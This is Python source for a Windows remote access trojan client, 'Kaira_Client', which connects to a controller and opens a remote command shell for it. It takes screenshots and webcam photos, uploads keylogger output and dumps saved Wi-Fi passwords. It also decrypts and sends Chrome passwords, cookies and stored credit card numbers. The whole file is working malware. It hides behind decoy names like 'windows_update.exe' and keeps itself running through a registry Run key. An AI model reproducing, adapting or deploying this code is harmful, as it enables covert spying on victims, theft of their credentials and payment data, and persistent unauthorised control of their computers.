import socket
import subprocess
import os
import threading
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from shutil import copyfile
from sys import executable, _MEIPASS
from PIL import ImageGrab
import public_ip
from cv2 import VideoCapture, imwrite
from time import sleep
from modules import key


class Kaira_Client():
    def __init__(self):
        self.connection = socket.socket()
        self.connection.connect((host, port))
        self.screenshot_location = os.environ["appdata"] + "\\windows_screen.png"
        self.camera_location = os.environ["appdata"] + "\\windows_update.png"
        self.key_file = key.key_file
        self.persistence_file = os.environ["appdata"] + "\\windows_update.exe"
        self.wifi_file = os.environ["appdata"] + "\\windows_error.txt"
        self.browser_pass_file = os.environ["appdata"] + "\\windows_database.db"
        self.browser_cookie_file = os.environ["appdata"] + "\\windows_data.db"
        self.cc_file = os.environ["appdata"] + "\\windows.db"

        computer_name = socket.gethostname()
        some_creds = computer_name + "\t" + public_ip_address + "\t" + os.name + "\t" + os.getcwd()
        self.connection.send(some_creds.encode())

    def download_file(self, file_name):
        file = open(file_name, "rb")
        file_content = file.read(1024)
        while file_content:
            self.connection.send(file_content)
            file_content = file.read(1024)
        file.close()

    def get_persistence(self):
        reg_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows_update /t REG_SZ /d " + self.persistence_file
        if not os.path.exists(self.persistence_file):
            copyfile(executable, self.persistence_file)
            subprocess.call(reg_command, shell=True)

    def remove_persistence(self):
        if os.path.exists(self.persistence_file):
            regedit_command = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows_update /f"
            subprocess.call(regedit_command, shell=True)
            os.remove(self.persistence_file)

    def get_wifi(self):
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True)
        data = meta_data.decode('utf-8', errors ="backslashreplace")
        data = data.split('\n')
        profiles = []
        for i in data:
            if "All User Profile" in i :
                i = i.split(":")
                i = i[1]
                i = i[1:-1]
                profiles.append(i)
        file = open(self.wifi_file, "w")
        file.write("{:<30}| {:<}\n".format("Wi-Fi Name", "Password"))
        file.write("----------------------------------------------\n")
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
            results = results.decode('utf-8', errors ="backslashreplace")
            results = results.split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                file.write("{:<30}| {:<}\n".format(i, results[0]))
            except IndexError:
                file.write("{:<30}| {:<}\n".format(i, ""))
            
        file.close()

    def get_ss(self):
        try:
            #self.screenshot_ = screenshot()
            #self.screenshot_.save(self.screenshot_location)
            ImageGrab.grab().save(self.screenshot_location)
            self.connection.send("ss_success".encode())
        except:
            self.connection.send("ss_error  ".encode())
        try:
            self.download_file(self.screenshot_location)
            sleep(1)
            if os.path.isfile(self.screenshot_location):
                os.remove(self.screenshot_location)
        except:
            sleep(1)
            self.connection.send("ss_download_error  ".encode())
            if os.path.isfile(self.screenshot_location):
                os.remove(self.screenshot_location)

    def get_camera_snapshot(self):
        camera = VideoCapture(0)
        result, image = camera.read()
        if result:
            imwrite(self.camera_location, image)
            camera.release()
            self.connection.send("camera_success".encode())
            try:
                self.download_file(self.camera_location)
                sleep(2)
                if os.path.isfile(self.camera_location):
                    os.remove(self.camera_location)
            except:
                self.connection.send("camera_download_error  ".encode())
                if os.path.isfile(self.camera_location):
                    os.remove(self.camera_location)
        else:
            self.connection.send("camera_error  ".encode())

    def get_chrome_datetime(self, chrome_date):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)
    
    def get_encryption_key(self):
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def decrypt_password(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
        

    def shell(self):
        while True:
            shell_command = self.connection.recv(1024).decode()
            shell_command = shell_command.split(" ")
            if shell_command[0] == "cd" and len(shell_command) > 1:
                try:
                    os.chdir(shell_command[1])
                    self.shell_command_output = f"[+]Directory changed to:{shell_command[1]} \t{os.getcwd()}"
                except:
                    self.shell_command_output = f"[-]Directory changing failed. \t{os.getcwd()}"
            elif shell_command[0] == "pwd":
                self.shell_command_output = os.getcwd()
            elif shell_command[0] == "mkdir" and len(shell_command) > 1:
                try:
                    os.mkdir(shell_command[1])
                    self.shell_command_output = f"[+]Directory created successfully:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]Directory creation failed."
            elif shell_command[0] == "rmdir" and len(shell_command) > 1:
                try:
                    os.rmdir(shell_command[1])
                    self.shell_command_output = f"[+]Directory removed successfully:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]Directory removing failed."
            elif shell_command[0] == "rm" and len(shell_command) > 1:
                try:
                    os.remove(shell_command[1])
                    self.shell_command_output = f"[+]File removed successfully:{shell_command[1]}"
                except:
                    self.shell_command_output = "[-]File removing failed."
            elif shell_command[0] == "rename" and len(shell_command) > 2:
                try:
                    os.rename(shell_command[1], shell_command[2])
                    self.shell_command_output = f"[+]Directory renamed successfully:{shell_command[1]} -----> {shell_command[2]}"
                except:
                    self.shell_command_output = "[-]Directory renaming failed."
            elif shell_command[0] == "download" and len(shell_command) > 1:
                try:
                    self.download_file(shell_command[1])
                    sleep(2)
                    self.shell_command_output = "download_success"
                except:
                    self.shell_command_output = "[-]File downloading failed."
            elif shell_command[0] == "exit":
                return 0
            else:
                try:
                    self.shell_command_output = subprocess.check_output(shell_command, shell=True, encoding='Latin1')
                except:
                    self.shell_command_output = "[-]Command executing failed."

            if not self.shell_command_output == "download_success": 
                self.connection.send(self.shell_command_output.encode())



    def core(self):
        while True:
            self.command = self.connection.recv(1024).decode()
            self.splitted_command = self.command.split(" ")
            if self.command == "shell":
                self.shell()

            elif self.command == "screenshot":
                self.get_ss()

            elif self.command == "camera_snapshot":
                self.get_camera_snapshot()
                
            elif self.command == "read_keys":
                try:
                    with open(self.key_file, "r", encoding="utf-8") as keys:
                        log = keys.read()
                    self.connection.send(log.encode())
                except:
                    self.connection.send("[-]Log file can't read.".encode())

            elif self.command == "get_keys":
                try:
                    self.download_file(self.key_file)
                    sleep(1)
                except:
                    self.connection.send("key_error  ".encode())

            elif self.command == "persistence":
                    try:
                        self.get_persistence()
                        self.connection.send("[+]Persistence activated.      ".encode())
                    except:
                        self.connection.send("[-]Persistence isn't activated.".encode())
            
            elif self.command == "remove_persistence":
                try:
                    self.remove_persistence()
                    self.connection.send("[+]Persistence deactivated.      ".encode())
                except:
                    self.connection.send("[-]Persistence isn't deactivated.".encode())

            elif self.command == "get_wifi":
                try:
                    self.get_wifi()
                    with open(self.wifi_file, "r", encoding="utf-8") as file:
                        wifi_ = file.read()
                    self.connection.send(wifi_.encode())
                    os.remove(self.wifi_file)
                except:
                    self.connection.send("[-]Can't get wifi creds.".encode())

            elif self.command == "system_info":
                system_info = subprocess.check_output("systeminfo", shell=True).decode("Latin1")
                self.connection.send(system_info.encode())

            elif self.splitted_command[0] == "get_browser_pass" and len(self.splitted_command) > 1:
                browser_data = ""
                key = self.get_encryption_key()
                if not os.path.isfile(self.browser_pass_file):
                    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
                    copyfile(db_path, self.browser_pass_file)
                db = sqlite3.connect(self.browser_pass_file)
                cursor = db.cursor()
                cursor.execute(f"select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins WHERE origin_url like '%{self.splitted_command[1]}%' order by date_created")
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    password = self.decrypt_password(row[3], key)
                    date_created = row[4]
                    date_last_used = row[5]        
                    if username or password:
                        browser_data = browser_data + f"Origin URL: {origin_url} \n"
                        browser_data = browser_data + f"Action URL: {action_url} \n"
                        browser_data = browser_data + f"Username: {username} \n"
                        browser_data = browser_data + f"Password: {password} \n"
                    else:
                        continue
                    if date_created != 86400000000 and date_created:
                        browser_data = browser_data + f"Creation date: {str(self.get_chrome_datetime(date_created))} \n"
                    if date_last_used != 86400000000 and date_last_used:
                        browser_data = browser_data + f"Last Used: {str(self.get_chrome_datetime(date_last_used))} \n"
                    browser_data = browser_data + "="*50 + "\n"
                cursor.close()
                db.close()
                if browser_data == "":
                    self.connection.send("[-]No passwords found.".encode())
                else:
                    self.connection.send(browser_data.encode())
                os.remove(self.browser_pass_file)

            elif self.splitted_command[0] == "get_cookie" and len(self.splitted_command) > 1:
                cookie = ""
                if not os.path.isfile(self.browser_cookie_file):
                    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
                    copyfile(db_path, self.browser_cookie_file)

                db = sqlite3.connect(self.browser_cookie_file)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                cursor.execute("""
                SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
                FROM cookies WHERE host_key like '%{0}%'""".format(self.splitted_command[1]))
                key = self.get_encryption_key()
                for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
                    if not value:
                        decrypted_value = self.decrypt_password(encrypted_value, key)
                    else:
                        decrypted_value = value
                    cookie = cookie + f"""
Host: {host_key}
Cookie name: {name}
Cookie value (decrypted): {decrypted_value}
Creation datetime (UTC): {self.get_chrome_datetime(creation_utc)}
Last access datetime (UTC): {self.get_chrome_datetime(last_access_utc)}
Expires datetime (UTC): {self.get_chrome_datetime(expires_utc)}
===============================================================
                    """
                if cookie == "":
                    self.connection.send("[-]No cookies found.".encode())
                else:
                    self.connection.send(cookie.encode())
                db.close()
                os.remove(self.browser_cookie_file)
            
            elif self.command == "get_browser_cc":
                cc = ""
                if not os.path.isfile(self.cc_file):
                    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Web Data")
                    copyfile(db_path, self.cc_file)
                db = sqlite3.connect(self.cc_file)
                db.text_factory = lambda b: b.decode(errors="ignore")
                cursor = db.cursor()
                cursor.execute("SELECT * FROM credit_cards")
                key = self.get_encryption_key()
                for item in cursor.fetchall():
                    username = item[1]
                    encrypted_password = item[4]
                    decrypted_password = self.decrypt_password(encrypted_password, key)
                    expire_mon = item[2]
                    expire_year = item[3]
                    cc = cc + f"""
Name and Surname: {username}
Credit Card Number: {decrypted_password}
Expiration Date: {expire_mon}/{expire_year}
===============================================================
"""
                if cc == "":
                    self.connection.send("[-]No credit cards found.".encode())
                else:
                    self.connection.send(cc.encode())
                db.close()
                os.remove(self.cc_file)

            elif self.command == "shutdown":
                self.connection.send("[+]Shutdowning computer...".encode())
                subprocess.call(["shutdown", "-s", "-t", "0"])

            elif self.command == "exit":
                self.connection.close()
                return 0


key_thread = threading.Thread(target=key.core_key)
key_thread.start()


try:
    public_ip_address = public_ip.get()
except:
    public_ip_address = "undefined"

def get_persistence():
    persistence_file = os.environ["appdata"] + "\\windows_update.exe"
    reg_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v windows_update /t REG_SZ /d " + persistence_file
    if not os.path.exists(persistence_file):
        copyfile(executable, persistence_file)
        subprocess.call(reg_command, shell=True)


